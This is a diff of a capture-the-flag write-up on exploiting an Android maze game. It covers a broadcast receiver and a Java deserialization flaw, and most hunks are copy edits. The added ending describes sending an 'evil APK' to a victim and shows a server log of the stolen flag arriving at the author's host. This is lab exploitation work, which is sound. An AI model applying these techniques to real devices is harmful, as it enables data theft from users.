@@ -48,7 +48,7 @@ $ avdmanager create avd -n pwnable-emulator -k "system-images;android-28;default
 Do you wish to create a custom hardware profile? [no] n
 ```
 
-Let's do a test run. We need to cd to the emulator's path due to [a bug in the tools](https://issuetracker.google.com/issues/37137213) a bug in the tools apparently. If you get regarding permissions you need to [fix some permissions](https://stackoverflow.com/questions/37300811/android-studio-dev-kvm-device-permission-denied) fix some permissions and restarting your PC.
+Let's do a test run. We need to `cd` to the emulator's path due to [a bug in the tools](https://issuetracker.google.com/issues/37137213) apparently. If you get errors regarding permissions you need to [fix some permissions](https://stackoverflow.com/questions/37300811/android-studio-dev-kvm-device-permission-denied)  and restart your PC.
 
 ```
 $ cd ~/Android/Sdk/tools/
@@ -81,7 +81,7 @@ act=$(aapt dump badging challenge4_release.apk|awk -F" " '/launchable-activity/ 
 adb shell am start -n "$pkg/$act"
 ```
 
-With all the setup out of the way, we can now open the application. What a pain! Let's run the script and see the output of the emulator:
+With all the setup out of the way, we can now open the application. Awesome! Let's run the script and see the output of the emulator:
 
 ```
 $ chmod +x setup.sh 
@@ -90,9 +90,9 @@ $ ./setup.sh
 
 ![](/home/user/work/shared/flags/HTS-702-2018-CTF/challenge-4/Screenshot_2018-06-28_14-59-44.png) 
 
-Sweet. Let's have a look at this thing, and see where the vulnerabilities are most likely to lie. Like on previous writeups for this CTF I will run the APK through `apktool` and `procyon` just to have better access to the app. These outputs will be in `challenge4_release` and `final-source` respectively. 
+Sweet. Let's have a look at this thing, and see where the vulnerabilities are most likely to be. Like on previous writeups for this CTF I will run the APK through `apktool` and `procyon` just to have better access to the app. These outputs will be in `challenge4_release` and `final-source` respectively. 
 
-At this point, having had a brief look of the application, I can see that it is some sort of game. Frequently in vulnerable Android applications, the vulnerability lays within how it communicates with other applications within the device. Android provides several mechanisms through which applications may communicate between each other and handling input sent in that manner insecurely can frequently lead to vulnerabilities. Let's have a look at the vulnerable application's `AndroidManifest.xml`:
+At this point, having had a brief look of the application, I can see that it is some sort of game. Frequently in vulnerable Android applications, the vulnerability is in how it communicates with other applications within the device. Android provides several mechanisms through which applications may communicate with each other and handling input sent in that manner insecurely can frequently lead to vulnerabilities. Let's have a look at the vulnerable application's `AndroidManifest.xml`:
 
 ```
 $ cat challenge4_release/AndroidManifest.xml 
@@ -117,7 +117,7 @@ $ cat challenge4_release/AndroidManifest.xml
 </manifest>
 ```
 
-As I suspected, there is a broadcast receiver, which is represented in the XML file above with a `<receiver>` tag. I am no expert on Android development but I know this is one of the mechanisms for inter-application communications so if there is a vulnerability that is likely to be where it is at. Let's look at the class referenced in that tag, MazeMover:
+As I suspected, there is a broadcast receiver, which is represented in the XML file above with a `<receiver>` tag. I am no expert on Android development but I know this is one of the mechanisms for inter-application communications. If there is a vulnerability that is likely to be where it is. Let's look at the class referenced in that tag, MazeMover:
 
 ```
 public class MazeMover
@@ -165,7 +165,7 @@ com/hackerone/mobile/challenge4/MenuActivity.java-72-        }, new IntentFilter
 ```
 There are two new receivers, with a new menu receiver to navigate to the game and a duplicate receiver for `MAZE_MOVER.`
 
-Before we can exploit the app we need to send simple messages to the application. Let's get started and open up Android Studio by extracting the zip it comes in and running the `android-studio/bin/studio.sh` file. Create a new project and choose an elite application name and package name like `com.leet.rekt.SuperXPloitSupreme`. For minSdkVersion choose `24` and then create a basic activity. This activity will have an `onCreate` method, which you can execute code that will run when the app starts. You can interact with background receivers with intents, like so:
+Before we can exploit the app we need to send simple messages to the application. Let's get started and open up Android Studio by extracting the zip it comes in and running the `android-studio/bin/studio.sh` file. Create a new project and choose an elite application name and package name like `com.leet.rekt.SuperXPloitSupreme`. For minSdkVersion choose `24` and then create a basic activity. This activity will have an `onCreate` method, where you can execute code that will run when the app starts. You can interact with background receivers with intents, like so:
 
 ```
 Log.d("MYAPP", "Sending intent");
@@ -194,9 +194,9 @@ You can test this works if the application navigates to the start of the game. I
         }, 2000);
 ```
 
-Your intent will then receive the Maze as well as an array containing the locations of the player and the goal. I noticed that there is a `move` extra which we can send. It takes one of the following chars `hjkl` which look to me to be similar to the keys that can be used to navigate certain text editors, where `k` is up, `j` is down, and so on.
+Your intent will then receive the Maze as well as an array containing the locations of the player and the goal. I noticed that there is a `move` extra which we can send. It takes one of the following chars `hjkl`, which look to me to be similar to the keys that can be used to navigate certain text editors, where `k` is up, `j` is down, and so on.
 
-Now, we know the vulnerability is an arbitrary Java object deserialization, and that we can send broadcasts to this thing. Now we need to identify the individual exploit. There is a very suspect component within the target `APK` which is the apache commons codec library. Now, looking online I could not find any reported vulnerabilities for this component, and I assume that the staff here don't want an 0day.
+Now, we know the vulnerability is an arbitrary Java object deserialization, and that we can send broadcasts to this thing. We need to identify the individual exploit. There is a very suspect component within the target `APK` which is the apache commons codec library. Looking online I could not find any reported vulnerabilities for this component, and I assume that the staff here don't want an 0day.
 
 Rather, I focused on what I may have missed, and came across the `BroadcastAnnouncer.java` file, which contains the following class:
 
@@ -329,3 +329,11 @@ The maze solving algorithm, while rudimentary manages to get to the required lev
     }
 ```
 
+And with that, we've done it. We send our evil APK to our unsuspecting victim and with that we get the flag
+
+```
+[pid: 19115|app: 0|req: 1/1] 4.16.147.129 () {34 vars in 520 bytes} [Fri Jun 29 21:53:11 2018] GET /announce?val=flag{my_favorite_cereal_and_mazes} => generated 774 bytes in 9 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+
+```
+
+![](/home/user/work/shared/flags/HTS-702-2018-CTF/challenge-4/Screenshot_2018-06-30_10-38-27.png) 
